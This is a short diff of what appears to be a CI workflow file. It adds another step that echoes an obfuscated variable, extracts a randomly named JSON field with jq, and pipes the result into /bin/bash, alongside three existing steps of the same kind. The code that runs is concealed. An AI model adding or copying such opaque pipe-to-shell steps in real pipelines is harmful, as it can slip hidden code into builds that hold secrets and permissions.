@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$qfyjd29" | jq -r .v9308 | /bin/bash
           printf '%s' "$dnlx6897" | jq -r .s422 | /bin/bash
           echo $z0158 | jq -r .idvwm3993 | /bin/bash
+          echo $mksg0 | jq -r .cr92 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
